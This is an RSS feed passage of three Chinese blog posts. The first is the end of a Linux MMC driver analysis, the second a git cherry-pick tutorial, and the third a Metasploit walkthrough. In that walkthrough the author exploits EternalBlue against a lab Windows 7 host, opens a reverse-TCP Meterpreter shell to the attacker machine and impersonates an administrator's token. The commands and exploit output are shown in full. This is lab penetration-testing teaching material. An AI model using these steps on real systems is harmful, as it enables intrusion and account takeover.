&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; __mmc_start_request(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, &lt;span&gt;struct&lt;/span&gt; mmc_request *&lt;span&gt;mrq)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    ...
    err &lt;/span&gt;=&lt;span&gt; mmc_retune(host);
    ...
    host&lt;/span&gt;-&amp;gt;ops-&amp;gt;&lt;span&gt;request(host, mrq);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;综合上述分析，可以将MMC驱动子系统流程分析概括为下图。从驱动编写的角度，只需关注MMC card设备注册相关代码，主要包含如下几个方面：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;将mmc host封装进一个 &lt;span class=&quot;cnblogs_code&quot;&gt;platform device&lt;/span&gt; ，同时定义一 &lt;span class=&quot;cnblogs_code&quot;&gt;platform driver&lt;/span&gt; ，并将它们注册到驱动模型中&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;platform driver&lt;/span&gt; 的 &lt;span class=&quot;cnblogs_code&quot;&gt;probe()&lt;/span&gt; 函数中调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_host()&lt;/span&gt; 和 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_host()&lt;/span&gt; ，将mmc card注册到驱动模型中&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://hughesxu.github.io/assets/img/sample/mmc_subsystem_driver_model.svg&quot; alt=&quot;MMC subsystem Driver Model&quot; width=&quot;1799&quot; height=&quot;1532&quot; data-loaded=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;h2&gt; &lt;/h2&gt;
&lt;h2&gt; &lt;/h2&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;[1] Linux设备驱动开发详解（基于最新的Linux4.0内核），宋宝华编著，2016年&lt;/span&gt;&lt;br/&gt;&lt;span&gt;[2] Linux SD/MMC/SDIO驱动分析：&lt;a href=&quot;https://www.cnblogs.com/cslunatic/p/3678045.html&quot;&gt;https://www.cnblogs.com/cslunatic/p/3678045.html&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Tue, 29 Sep 2020 12:19:00 +0000</pubDate>
<dc:creator>hueyxu</dc:creator>
<og:description>Linux内核设计了MMC子系统，用于管理MMC/SD设备。本文通过内核源码（Linux Kernel 5.2）对MMC驱动子系统进行简述，通过MMC驱动的实际案例说明MMC驱动编写的一般步骤，并分析</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/hueyxu/p/13751636.html</dc:identifier>
</item>
<item>
<title>git  一个可以提高开发效率的命令：cherry-pick - 良许Linux</title>
<link>http://www.cnblogs.com/yychuyu/p/13751649.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yychuyu/p/13751649.html</guid>
<description>&lt;p&gt;各位码农朋友们一定有碰到过这样的情况：在develop分支上辛辛苦苦撸了一通代码后开发出功能模块A，B，C，这时老板过来说，年青人，我们现在先上线功能模块A，B。你一定心里一万只草泥马奔腾而过，但为了混口饭吃必须得按老板的意思办事啊。&lt;/p&gt;
&lt;p&gt;怎么办？一个办法就是，重新建一个分支，然后再把功能模块C回退，留下功能模块A，B。这种做法不是不行，但是有更好的办法，那就是git所提供的cherry-pick功能。&lt;/p&gt;
&lt;p&gt;cherry-pick类似于一个定制化的merge，它可以把其它分支上的commit一个个摘下来，合并到当前分支。&lt;/p&gt;
&lt;p&gt;废话不多说，直接上实例。&lt;/p&gt;
&lt;p&gt;比如我现在有个文件a.c，我在develop分支完成了三个功能模块：feature A，feature B，feature C。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201721574-824982021.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;现在，坑爹的老板只要feature A，feature B，我们现在用cherry-pick命令直接把feature A，feature B的提交合并到master分支里，如下操作：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201724450-1851859502.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，功能模块feature A，feature B已经被合并到master分支里。请注意，合并到master分支里的提交哈希值发生了改变，与原来的不同。&lt;/p&gt;
&lt;p&gt;可以看出，cherry-pick命令使用方法很简单，即：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;git cherry-pick commitID
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;刚刚是一个个提交cherry-pick到master分支，但如果有100个commit要合并到master分支呢？总不能这样一个个操作吧？git一样帮你想到了，它提供了一个区间操作方法。具体来讲是这样的：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;git cherry-pick commit1..commit100
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是要注意，这是一个左开右闭的操作，也就是说，commit1不会被合并到master分支，而commit100则会。这样的话上面的需求可以如下操作来实现：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201726828-1900746941.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注意：上面讲到cherry-pick命令每拣选一个commit就会提交一次生成一个新的commit id。 如果我们想让每个commit 拣选后暂缓提交，等到所有commit都拣选完成后，自己手动commit，应该怎么办呢？答案是用-n 选项：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201729635-161268220.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;怎样，是不是很简单？学会了cherry-pick命令妈妈再也不用担心老板时不时的头脑发热了。快扫描下方二维码和良许一起学习更多git神操作！&lt;/p&gt;
&lt;p&gt;更多精彩内容，请关注公众号&lt;strong&gt;良许Linux&lt;/strong&gt;，公众内回复&lt;strong&gt;1024&lt;/strong&gt;可免费获得5T技术资料，包括：&lt;strong&gt;Linux，C/C++，Python，树莓派，嵌入式，Java，人工智能&lt;/strong&gt;，等等。公众号内回复&lt;strong&gt;进群&lt;/strong&gt;，邀请您进高手如云技术交流群。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://pbe9kvqil.bkt.clouddn.com/FmsDX2j5rcQ7DjY8p-KYTN7m5uNu&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;公众号：良许Linux&lt;/p&gt;
&lt;img src=&quot;https://pic.downk.cc/item/5e618d2f98271cb2b8f65fe8.jpg&quot;/&gt;&lt;h3 id=&quot;有收获？希望老铁们来个三连击，给更多的人看到这篇文章&quot;&gt;有收获？希望老铁们来个三连击，给更多的人看到这篇文章&lt;/h3&gt;
</description>
<pubDate>Tue, 29 Sep 2020 12:18:00 +0000</pubDate>
<dc:creator>良许Linux</dc:creator>
<og:description>各位码农朋友们一定有碰到过这样的情况：在develop分支上辛辛苦苦撸了一通代码后开发出功能模块A，B，C，这时老板过来说，年青人，我们现在先上线功能模块A，B。你一定心里一万只草泥马奔腾而过，但为了</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yychuyu/p/13751649.html</dc:identifier>
</item>
<item>
<title>Metasploit之令牌窃取 - coderge</title>
<link>http://www.cnblogs.com/coderge/p/13751501.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/coderge/p/13751501.html</guid>
<description>&lt;p&gt;令牌(Token) 就是系统的临时密钥，相当于账户名和密码，用来决定是否允) 许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。&lt;br/&gt;令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来。令牌有很多种，比如访问令牌(Access Token)表示访问控制操作主题的系统对象；密保令牌(Security token)，又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备，例如U盾；会话令牌(Session Token)是交互会话中唯一的身份标识符。&lt;br/&gt;在假冒令牌攻击中需要使用Kerberost协议。所以在使用假冒令牌前，先来介绍Kerberost协议。Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。Kerberos的工作机制如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929191459999-2013212557.png&quot; alt=&quot;Kerberos工作机制&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;客户端请求证书的过程如下所示。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;客户端向认证服务器(AS)发送请求，要求得到服务器的证书。&lt;/li&gt;
&lt;li&gt;AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。该证书包括服务器ticket (包括服务器密钥加密的客户机身份和一份会话密钥)和一个临时加s密密钥(又称为会话密钥，session key) 。当然，认证服务器也会给服务器发送一份该证书，用来使服务器认证登录客户端的身份。&lt;/li&gt;
&lt;li&gt;客户端将ticket传送到服务器上，服务器确认该客户端的话，便允许它登录服务器。&lt;/li&gt;
&lt;li&gt;客户端登录成功后，攻击者就可以通过入侵服务器获取客户端的令牌。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;攻击机kali：192.168.1.104&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;靶机win7：192.168.1.102&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;msf5 &amp;gt; search ms17_010            # 搜索永恒之蓝漏洞利用模块

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   1  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   2  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
   3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


msf5 &amp;gt; use exploit/windows/smb/ms17_010_eternalblue    # 用这个模块，注意，靶机别打补丁，别开防火墙，以保证试验成功
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp       # 用这个payload
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set RHOST 192.168.1.102         # 设置目标机IP
RHOST =&amp;gt; 192.168.1.102
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set LHOST 192.168.1.104         # 设置攻击机IP
LHOST =&amp;gt; 192.168.1.104
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; run                           # 开炮开炮开炮！！！

[*] Started reverse TCP handler on 192.168.1.104:4444 
[*] 192.168.1.102:445 - Connecting to target for exploitation.
[+] 192.168.1.102:445 - Connection established for exploitation.
[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.102:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.1.102:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.102:445 - Starting non-paged pool grooming
[+] 192.168.1.102:445 - Sending SMBv2 buffers
[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.102:445 - Sending final SMBv2 buffers.
[*] 192.168.1.102:445 - Sending last fragment of exploit packet!
[*] 192.168.1.102:445 - Receiving response from exploit packet
[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.102:445 - Sending egg to corrupted connection.
[*] 192.168.1.102:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 192.168.1.102
[*] Meterpreter session 1 opened (192.168.1.104:4444 -&amp;gt; 192.168.1.102:49163) at 2020-09-29 19:22:08 +0800
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter &amp;gt;                                                # 可以开干坏事啦

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时我们通过一系列前期渗透: &lt;a href=&quot;https://www.jianshu.com/p/03a1c13f963a&quot;&gt;https://www.jianshu.com/p/03a1c13f963a&lt;/a&gt;，已经成功获得了目标机的MeterpreterShell，首先输入getuid命令查看已经获得的权限，然后输入getsystem，发现提权失败。&lt;br/&gt;（咦。。。直接system权限我透，算了继续做，当作我没有的亚子……&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929192455730-1702726665.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们先输入&lt;code&gt;use incognito&lt;/code&gt;命令，然后输入&lt;code&gt;list_tokens -u&lt;/code&gt;列出可用的token如下：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929192753449-1834236666.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到有两种类型的令牌: 一种是Delegation Tokens，也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问) ；还有一种是Impersonation Tokens，也就是模拟令牌，它是非交互的会话。令牌的数量其实取决于Meterpreter Shell的访问级别。&lt;br/&gt;由上图可以看到，我们已经获得了一个系统管理员ge的授权令牌，现在就要假冒这个令牌，成功后即可拥有它的权限。&lt;br/&gt;从输出的信息可以看到分配的有效令牌包含ge-PC\ge，其中ge-PC是目标机的主机名，ge表示登录的用户名。接下来在incognito中调用impersonate token命令假冒ge用户进行攻击，具体方法如下图所示。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929193411684-336758425.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：在输入HOSTNAME\USERNAME时需要两个反斜杠（\）&lt;/strong&gt;&lt;br/&gt;运行成功后在Meterpreter Shell下运行shell命令并输入whoami，可以看到笔者现在就是假冒的那个ge-pc\ge系统管理员了。&lt;/p&gt;

&lt;p&gt;本文参考 开篇的博客链接 及 《Web安全攻防：渗透测试实战指南》&lt;br/&gt;所有过程仅供演示交流，&lt;strong&gt;禁止用于非法用途&lt;/strong&gt;，由此产生的非法后果与我无瓜！！！&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 11:40:00 +0000</pubDate>
<dc:creator>coderge</dc:creator>
<og:description>令牌简介及原理 令牌(Token) 就是系统的临时密钥，相当于账户名和密码，用来决定是否允) 许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/coderge/p/13751501.html</dc:identifier>
</item>
</channel>
</rss>